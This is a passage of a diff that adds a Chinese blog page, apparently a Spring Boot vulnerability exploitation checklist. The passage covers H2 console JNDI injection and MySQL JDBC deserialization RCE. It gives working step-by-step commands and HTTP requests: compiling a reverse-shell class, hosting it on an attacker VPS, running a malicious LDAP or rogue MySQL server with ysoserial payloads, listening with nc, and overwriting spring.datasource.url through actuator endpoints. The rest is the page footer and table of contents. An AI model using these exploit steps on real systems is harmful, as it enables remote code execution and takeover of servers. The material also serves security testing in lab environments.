+  <li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li>
+</ul>
+
+<h4 id="利用方法-10">利用方法：</h4>
+
+<h5 id="步骤一访问路由获得-jsessionid">步骤一：访问路由获得 jsessionid</h5>
+
+<p>直接访问目标开启 h2 console 的默认路由 <code class="language-plaintext highlighter-rouge">/h2-console</code>，目标会跳转到页面 <code class="language-plaintext highlighter-rouge">/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code class="language-plaintext highlighter-rouge">jsessionid=xxxxxx</code> 值。</p>
+
+<h5 id="步骤二准备要执行的-java-代码-1">步骤二：准备要执行的 Java 代码</h5>
+
+<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code class="language-plaintext highlighter-rouge">JNDIObject.java</code>，</p>
+
+<p>使用兼容低版本 jdk 的方式编译：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac <span class="nt">-source</span> 1.5 <span class="nt">-target</span> 1.5 JNDIObject.java
+</code></pre></div></div>
+
+<p>然后将生成的 <code class="language-plaintext highlighter-rouge">JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
+
+<h5 id="步骤三托管-class-文件-1">步骤三：托管 class 文件</h5>
+
+<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>
+
+python2 <span class="nt">-m</span> SimpleHTTPServer 80
+python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>
+
+<h5 id="步骤四架设恶意-ldap-服务-1">步骤四：架设恶意 ldap 服务</h5>
+
+<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+</code></pre></div></div>
+
+<h5 id="步骤五监听反弹-shell-的端口-2">步骤五：监听反弹 shell 的端口</h5>
+
+<p>一般使用 nc 监听端口，等待反弹 shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lv</span> 443
+</code></pre></div></div>
+
+<h5 id="步骤六发包触发-jndi-注入">步骤六：发包触发 JNDI 注入</h5>
+
+<p>根据实际情况，替换下面数据中的 <code class="language-plaintext highlighter-rouge">jsessionid=xxxxxx</code>、<code class="language-plaintext highlighter-rouge">www.example.com</code> 和 <code class="language-plaintext highlighter-rouge">ldap://your-vps-ip:1389/JNDIObject</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /h2-console/login.do?jsessionid<span class="o">=</span>xxxxxx
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Referer: http://www.example.com/h2-console/login.jsp?jsessionid<span class="o">=</span>xxxxxx
+
+<span class="nv">language</span><span class="o">=</span>en&amp;setting<span class="o">=</span>Generic+H2+%28Embedded%29&amp;name<span class="o">=</span>Generic+H2+%28Embedded%29&amp;driver<span class="o">=</span>javax.naming.InitialContext&amp;url<span class="o">=</span>ldap://your-vps-ip:1389/JNDIObject&amp;user<span class="o">=</span>&amp;password<span class="o">=</span>
+</code></pre></div></div>
+
+<h4 id="漏洞分析-6">漏洞分析：</h4>
+
+<p>​	<a href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p>
+
+<h4 id="漏洞环境-6">漏洞环境：</h4>
+
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository/springboot-h2-database-rce</a></p>
+
+<p>正常访问：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9096/h2-console
+</code></pre></div></div>
+
+<h3 id="0x08mysql-jdbc-deserialization-rce">0x08：mysql jdbc deserialization RCE</h3>
+
+<h4 id="利用条件-11">利用条件：</h4>
+
+<ul>
+  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
+  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
+  <li>目标环境中存在 <code class="language-plaintext highlighter-rouge">mysql-connector-java</code> 依赖</li>
+  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
+</ul>
+
+<h4 id="利用方法-11">利用方法：</h4>
+
+<h5 id="步骤一查看环境依赖">步骤一：查看环境依赖</h5>
+
+<p>GET 请求 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code>，搜索环境变量（classpath）中是否有 <code class="language-plaintext highlighter-rouge">mysql-connector-java</code>  关键词，并记录下其版本号（5.x 或 8.x）；</p>
+
+<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  <code class="language-plaintext highlighter-rouge">commons-collections</code>、<code class="language-plaintext highlighter-rouge">Jdk7u21</code>、<code class="language-plaintext highlighter-rouge">Jdk8u20</code> 等；</p>
+
+<p>搜索 <code class="language-plaintext highlighter-rouge">spring.datasource.url</code> 关键词，记录下其 <code class="language-plaintext highlighter-rouge">value</code>  值，方便后续恢复其正常 jdbc url 值。</p>
+
+<h5 id="步骤二架设恶意-rogue-mysql-server">步骤二：架设恶意 rogue mysql server</h5>
+
+<p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> ysoserial.jar CommonsCollections3 calc <span class="o">&gt;</span> payload.ser
+</code></pre></div></div>
+
+<p>在脚本<strong>同目录下</strong>生成 <code class="language-plaintext highlighter-rouge">payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
+
+<h5 id="步骤三设置-springdatasourceurl-属性">步骤三：设置 spring.datasource.url 属性</h5>
+
+<blockquote>
+  <p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
+</blockquote>
+
+<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
+</code></pre></div></div>
+
+<p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
+</code></pre></div></div>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.datasource.url=对应属性值
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
+Content-Type: application/json
+
+{"name":"spring.datasource.url","value":"对应属性值"}
+</code></pre></div></div>
+
+<h5 id="步骤四刷新配置-1">步骤四：刷新配置</h5>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
+Content-Type: application/json
+
+</code></pre></div></div>
+
+<h5 id="步骤五触发数据库查询">步骤五：触发数据库查询</h5>
+
+<p>尝试访问网站已知的数据库查询的接口，例如： <code class="language-plaintext highlighter-rouge">/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
+
+<h5 id="步骤六恢复正常-jdbc-url">步骤六：恢复正常 jdbc url</h5>
+
+<p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code class="language-plaintext highlighter-rouge">spring.datasource.url</code> 的原始 <code class="language-plaintext highlighter-rouge">value</code> 值</p>
+
+<h4 id="漏洞原理-6">漏洞原理：</h4>
+
+<ol>
+  <li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
+  <li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
+  <li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li>
+  <li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li>
+  <li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li>
+</ol>
+
+<h4 id="漏洞分析-7">漏洞分析：</h4>
+
+<p>​	<a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p>
+
+<h4 id="漏洞环境-7">漏洞环境：</h4>
+
+<blockquote>
+  <p>需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出</p>
+</blockquote>
+
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce">repository/springboot-mysql-jdbc-rce</a></p>
+
+<p>正常访问：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9097/actuator/env
+</code></pre></div></div>
+
+<p>发送完 payload 后触发漏洞：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9097/product/list
+</code></pre></div></div>
+
+
+                <!-- [x] 2022/10/20/10:49:36 fixed: while width < some inch. would be flex column not display like a row.-->
+<footer>
+	<style>.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}</style>
+	<div class="border-top"></div>
+		<section class="container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto">
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix ">
+				<h2 class="lead">申明</h2>
+				<div>
+					<div class="mb-2"><a href="/blog/2020/spring-boot-vuln-summary/" target="_blank" class=" text-bold">
+						<div class="fa fa-link"></div>
+						转载请申明本文档链接</a></div>
+					<div><a href="https://github.com/LandGrey" target="_blank"  class="text-bold">
+						<div class="fa fa-user"></div>
+						Post by LandGrey.</a>
+					</div>
+				</div>
+			</div>
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">贡献开源文档</h2>
+				<div>
+					<a href="https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2020-09-25-spring-boot-vuln-summary.markdown" target="_blank" class="no-underline btn mr-1 color-border-accent-emphasis">
+						<svg aria-hidden="true" focusable="false" role="img" class="octicon mr-1" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;"><path fill-rule="evenodd" d="M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z"></path></svg>
+						贡献当前开源文档
+					</a>
+					<p class="f0_8-l mt-2 text-bold">此之前，学习开源贡献<a target="_blank" href="https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码">CN&nbsp;|</a>
+						<a target="_blank" href="https://github.com/github/docs/blob/main/CONTRIBUTING.md">EN</a></p>
+				</div>
+			</div>
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">此文档对您有帮助吗</h2>
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/" target="_blank" class="no-underline">
+				<span class="btn mr-1 color-border-accent-emphasis" title="给文档仓库点个赞!">
+					<div class="fa fa-thumbs-o-up"></div>
+				</span>
+				</a>
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&template=2-bug_report.yaml&title=_posts/blog/2020-09-25-spring-boot-vuln-summary.markdown&nbsp; 不得不谈的：「Spring Boot」未授权渗透 | © 哨兵 | SENTINEL SECURITY, LAB" target="_blank">
+				<span class="btn mr-1 color-border-accent-emphasis" title="本文档有问题?">
+				<div class="fa fa-thumbs-o-down"></div>
+				</span>
+				</a>
+			</div>
+		</section>
+</footer>
+            </div>
+            <div class="spacing"></div>
+        </div><!--/col-lg-8 -->
+        
+<div class="ml-hide article-index thin-scrollbar position-sticky top-0" style="max-height: 100vh; overflow-y: auto;">
+    <div class="nav nav-stacked tableOfContents_35-E">
+        <li class=" table-of-contents">
+            <code-index-css>
+                <ul><li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column"><a>文章目录</a></li></ul>
+                <ul id="toc" class="section-nav">
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#声明">声明</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#spring-boot-vulnerability-exploit-checklist">Spring Boot Vulnerability Exploit CheckList</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#零路由和版本">零：路由和版本</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x01路由知识">0x01：路由知识</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x02版本知识">0x02：版本知识</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#常见组件的版本相互依赖关系">常见组件的版本相互依赖关系：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#spring-cloud-与-spring-boot-大版本之间的依赖关系">Spring Cloud 与 Spring Boot 大版本之间的依赖关系：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#spring-cloud-小版本号的后缀及含义">Spring Cloud 小版本号的后缀及含义:</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#一信息泄露">一：信息泄露</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x01路由地址及接口调用详情泄漏">0x01：路由地址及接口调用详情泄漏</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x02配置不当而暴露的路由">0x02：配置不当而暴露的路由</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x03获取被星号脱敏的密码的明文-方法一">0x03：获取被星号脱敏的密码的明文 (方法一)</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法">利用方法：</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x04获取被星号脱敏的密码的明文-方法二">0x04：获取被星号脱敏的密码的明文 (方法二)</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-1">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-1">利用方法：</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x05获取被星号脱敏的密码的明文-方法三">0x05：获取被星号脱敏的密码的明文 (方法三)</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-2">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-2">利用方法：</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x06获取被星号脱敏的密码的明文-方法四">0x06：获取被星号脱敏的密码的明文 (方法四)</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-3">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-3">利用方法：</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#二远程代码执行">二：远程代码执行</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-4">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-4">利用方法：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞原理">漏洞原理：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞分析">漏洞分析：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞环境">漏洞环境：</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-5">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-5">利用方法：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞原理-1">漏洞原理：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞分析-1">漏洞分析：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞环境-1">漏洞环境：</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-6">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-6">利用方法：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞原理-2">漏洞原理：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞分析-2">漏洞分析：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞环境-2">漏洞环境：</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-7">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-7">利用方法：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞原理-3">漏洞原理：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞分析-3">漏洞分析：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞环境-3">漏洞环境：</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-8">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-8">利用方法：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞原理-4">漏洞原理：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞分析-4">漏洞分析：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞环境-4">漏洞环境：</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x06h2-database-query-rce">0x06：h2 database query RCE</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-9">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-9">利用方法：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞原理-5">漏洞原理：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞分析-5">漏洞分析：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞环境-5">漏洞环境：</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-10">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-10">利用方法：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞分析-6">漏洞分析：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞环境-6">漏洞环境：</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#0x08mysql-jdbc-deserialization-rce">0x08：mysql jdbc deserialization RCE</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用条件-11">利用条件：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#利用方法-11">利用方法：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞原理-6">漏洞原理：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞分析-7">漏洞分析：</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4"><a href="#漏洞环境-7">漏洞环境：</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+            </code-index-css>
+        </li>
+    </div>
+</div>
+
+
+    </div><!--/row -->
+</div><!--/container -->
+                <!-- 代码引用申明/code reference declaration:
+#############################################################################
+## code from cloudflare. visit footer in https://www.cloudflare.com/zh-cn/ ##
+#############################################################################
+-->
+
+<div id="footerwrap" class="hidden-print">
+    <div class="footer-container">
+        <div class="pt3 pt3-ns pt3-m pt7-l pb0 pb0-ns pb0-m pb5-l">
+            <div class="footer-row">
+                
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>入门</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/usage/" target="_blank">快速开始</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/2019/jekyll/in/linux/" target="_blank">博客搭建</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/2019/nginx/with/jekyll-site/" target="_blank">公网部署</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/tuna/mirror-web/" target="_blank">Jekyll Tuna源码</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>社区</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bigger-than-bigger/" target="_blank">Bigger than Bigger</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="_blank">Collection Of Verified Vulnerabilities</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/sweet-ysoserial" target="_blank">sweet-ysoserial</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>技术栈</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://jekyllrb.com/docs/" target="_blank">Jekyll</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://www.markdownguide.org/" target="_blank">MarkDown</a></li>
+            
